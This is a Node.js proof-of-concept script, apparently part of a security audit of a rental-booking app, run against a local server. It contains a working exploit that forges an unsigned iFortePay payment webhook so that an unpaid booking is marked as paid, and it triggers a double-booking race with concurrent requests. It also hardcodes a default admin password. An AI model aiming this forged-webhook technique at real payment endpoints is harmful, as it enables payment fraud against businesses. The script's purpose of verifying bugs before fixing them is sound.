/**
 * PROOF-OF-CONCEPT: Bug #1 (iFortePay webhook no signature) + Bug #4 (double-booking race)
 *
 * Runs against http://localhost:5173. Demonstrates the bugs EXIST before they are fixed.
 * Safe to run locally — no real payment, no real money.
 *
 * Usage: ADMIN_PASSWORD=admin123 node scripts/proof-payment-bugs.mjs
 */
const BASE = 'http://localhost:5173';
const API = `${BASE}/api/v1`;

let cookie = '';

async function api(method, path, body) {
	const res = await fetch(`${API}${path}`, {
		method,
		headers: {
			'Content-Type': 'application/json',
			...(cookie ? { Cookie: cookie } : {}),
		},
		body: body ? JSON.stringify(body) : undefined,
	});
	const text = await res.text();
	let json;
	try { json = JSON.parse(text); } catch { json = { raw: text }; }
	return { status: res.status, json, headers: res.headers };
}

async function login() {
	console.log('🔐 Logging in as admin...');
	const res = await fetch(`${API}/auth/login`, {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		body: JSON.stringify({
			email: 'admin@savanna.local',
			password: process.env.ADMIN_PASSWORD || 'admin123',
		}),
	});
	const setCookie = res.headers.get('set-cookie');
	if (setCookie) cookie = setCookie.split(';')[0];
	const body = await res.json();
	// Login endpoint returns {data: {...}} directly (no success field),
	// while other endpoints return {success: true, data: {...}}. Accept either.
	if (body.data && !body.error) {
		console.log('   ✅ Logged in as', body.data.email, '\n');
		return true;
	}
	console.log('   ❌ Login failed:', body.error?.message ?? JSON.stringify(body));
	return false;
}

async function getBooking(id) {
	const r = await api('GET', `/bookings/${id}`);
	return r.json.data;
}

// ============================================================
// PROOF #1: iFortePay webhook with NO signature verification
// ============================================================
async function proveIfortepayWebhookBug() {
	console.log('═'.repeat(60));
	console.log('  BUG #1: iFortePay webhook — NO signature verification');
	console.log('═'.repeat(60));

	// Step 1: Create a vehicle + booking in Pending state
	console.log('\n📝 Step 1: Create a test vehicle + booking (status: Pending)...');

	// Create vehicle (unique plate per run via timestamp)
	const stamp = Date.now().toString().slice(-6);
	const vehRes = await api('POST', '/vehicles', {
		name: 'Payment Test Bike',
		plateNumber: `PAY ${stamp} TS`,
		type: 'TrailBike',
		dailyRateIdr: 200000,
	});
	const vehicleId = vehRes.json.data?.id;
	if (!vehicleId) {
		console.log('   ❌ Could not create vehicle:', vehRes.json);
		return;
	}
	console.log(`   ✅ Vehicle created: ${vehicleId}`);

	// Create customer (unique phone per run)
	const custRes = await api('POST', '/customers', {
		name: 'Payment Test Customer',
		phone: `+62899${stamp}001`,
	});
	const customerId = custRes.json.data?.id;
	if (!customerId) {
		console.log('   ❌ Could not create customer:', custRes.json);
		return;
	}
	console.log(`   ✅ Customer created: ${customerId}`);

	// Create booking
	const bookRes = await api('POST', '/bookings', {
		customerId,
		vehicleId,
		startDate: '2026-09-01',
		endDate: '2026-09-03',
		paymentTerms: 'Full_Upfront',
	});
	const booking = bookRes.json.data;
	if (!booking) {
		console.log('   ❌ Could not create booking:', bookRes.json);
		return;
	}
	console.log(`   ✅ Booking created: ${booking.bookingNumber} (id: ${booking.id})`);
	console.log(`   📊 Booking status BEFORE attack: ${booking.status}`);
	console.log(`   📊 Payment status BEFORE: ${booking.paymentStatus ?? 'null'}`);

	// Step 2: Send FAKE webhook — NO signature, NO auth, just raw POST
	console.log('\n💀 Step 2: Attacker sends FAKE iFortePay webhook (no signature, no auth)...');
	console.log('   (simulating: curl -X POST .../webhooks/ifortepay/notification)');

	const fakeWebhookRes = await fetch(`${API}/webhooks/ifortepay/notification`, {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		// No x-callback-token, no signature — completely unauthenticated
		body: JSON.stringify({
			order_id: booking.bookingNumber,
			transaction_status: 'SUCCESS',
			transaction_id: 'FAKE-TXN-' + Date.now(),
			amount: 1,
			payment_method: 'QRIS',
			paid_date: new Date().toISOString(),
		}),
	});
	const fakeBody = await fakeWebhookRes.json();
	console.log(`   📨 Webhook response: HTTP ${fakeWebhookRes.status} →`, JSON.stringify(fakeBody));

	// Step 3: Check booking status AFTER
	console.log('\n🔍 Step 3: Check booking status AFTER fake webhook...');
	await new Promise(r => setTimeout(r, 500));
	const updatedBooking = await getBooking(booking.id);

	console.log(`   📊 Booking status AFTER:  ${updatedBooking.status}`);
	console.log(`   📊 Payment status AFTER:  ${updatedBooking.paymentStatus ?? 'null'}`);
	console.log(`   📊 Paid at:               ${updatedBooking.paidAt ?? 'null'}`);

	// Check payments
	const payRes = await api('GET', `/payments?bookingId=${booking.id}`);
	const payments = payRes.json.data?.items ?? [];
	console.log(`   📊 Payment records:       ${payments.length}`);
	if (payments.length > 0) {
		console.log(`   📊 Payment status:        ${payments[0].status} (amount: ${payments[0].amount})`);
		console.log(`   📊 Payment method:        ${payments[0].method}`);
		console.log(`   📊 Verified by:           ${payments[0].verifiedBy ?? 'null (auto-webhook)'}`);
	}

	// Verdict
	const wasConfirmed = updatedBooking.status === 'Confirmed' || updatedBooking.status === 'pending_payment';
	const hasVerifiedPayment = payments.some(p => p.status === 'Verified');

	console.log('\n' + '─'.repeat(60));
	if (wasConfirmed || hasVerifiedPayment) {
		console.log('  ❌ BUG CONFIRMED: Booking marked PAID from an unauthenticated fake webhook!');
		console.log('     An attacker can confirm ANY booking as paid without paying.');
		console.log('     Impact: Payment fraud — free rentals.');
	} else {
		console.log('  ✅ NOT VULNERABLE: Webhook rejected the fake request.');
	}
	console.log('─'.repeat(60) + '\n');
}

// ============================================================
// PROOF #4: Double-booking race condition
// ============================================================
async function proveDoubleBookingRace() {
	console.log('═'.repeat(60));
	console.log('  BUG #4: Double-booking race condition (no transaction)');
	console.log('═'.repeat(60));

	// Create a fresh vehicle (unique plate per run)
	console.log('\n📝 Step 1: Create a test vehicle...');
	const stamp2 = Date.now().toString().slice(-6);
	const vehRes = await api('POST', '/vehicles', {
		name: 'Race Test Bike',
		plateNumber: `RCE ${stamp2} TS`,
		type: 'TrailBike',
		dailyRateIdr: 150000,
	});
	const vehicleId = vehRes.json.data?.id;
	console.log(`   ✅ Vehicle: ${vehicleId}`);

	const custRes = await api('POST', '/customers', {
		name: 'Race Customer A',
		phone: `+62899${stamp2}101`,
	});
	const custA = custRes.json.data?.id;
	const custRes2 = await api('POST', '/customers', {
		name: 'Race Customer B',
		phone: `+62899${stamp2}102`,
	});
	const custB = custRes2.json.data?.id;
	console.log(`   ✅ Customer A: ${custA}`);
	console.log(`   ✅ Customer B: ${custB}`);

	// Send TWO bookings SIMULTANEOUSLY for the same vehicle + dates
	console.log('\n⚡ Step 2: Send TWO bookings SIMULTANEOUSLY (same vehicle, same dates)...');

	const bookingPayload = (customerId, label) => ({
		customerId,
		vehicleId,
		startDate: '2026-10-15',
		endDate: '2026-10-17',
		paymentTerms: 'Full_Upfront',
		notes: `Concurrent booking ${label}`,
	});

	// Fire both at the exact same time (Promise.all, not sequential)
	const [resA, resB] = await Promise.all([
		api('POST', '/bookings', bookingPayload(custA, 'A')),
		api('POST', '/bookings', bookingPayload(custB, 'B')),
	]);

	console.log(`   📨 Booking A response: HTTP ${resA.status} → success: ${resA.json.success}`);
	console.log(`   📨 Booking B response: HTTP ${resB.status} → success: ${resB.json.success}`);

	const bookingA = resA.json.data;
	const bookingB = resB.json.data;

	console.log(`\n   📊 Booking A: ${bookingA?.bookingNumber ?? 'FAILED'} (status: ${bookingA?.status ?? 'n/a'})`);
	console.log(`   📊 Booking B: ${bookingB?.bookingNumber ?? 'FAILED'} (status: ${bookingB?.status ?? 'n/a'})`);

	console.log('\n' + '─'.repeat(60));
	if (bookingA && bookingB) {
		console.log('  ❌ BUG CONFIRMED: Both bookings succeeded for the same vehicle + dates!');
		console.log(`     Vehicle ${vehicleId} is now double-booked for 2026-10-15 → 2026-10-17.`);
		console.log('     Two customers "own" the same bike for the same period.');
		console.log('     Impact: Overbooking, customer conflict at pickup.');
	} else if (bookingA || bookingB) {
		console.log('  ⚠️  PARTIAL: One booking succeeded, one failed.');
		console.log('     The race may not have triggered on this run (timing-dependent).');
		console.log('     Re-run the script to try again — races are non-deterministic.');
	} else {
		console.log('  ✅ NOT VULNERABLE: Both bookings were rejected.');
	}
	console.log('─'.repeat(60) + '\n');
}

// ============================================================
// MAIN
// ============================================================
async function main() {
	console.log('\n🧪 PAYMENT BUG PROOF-OF-CONCEPT (safe, local, no real money)\n');

	const loggedIn = await login();
	if (!loggedIn) {
		console.log('Cannot proceed without login. Run: node scripts/reset-admin-password.mjs');
		process.exit(1);
	}

	await proveIfortepayWebhookBug();
	await proveDoubleBookingRace();

	console.log('═'.repeat(60));
	console.log('  Proof complete. Review the output above.');
	console.log('  These bugs are REAL and exploitable — see the audit report.');
	console.log('═'.repeat(60) + '\n');
}

main().catch(e => {
	console.error('Fatal error:', e);
	process.exit(1);
});
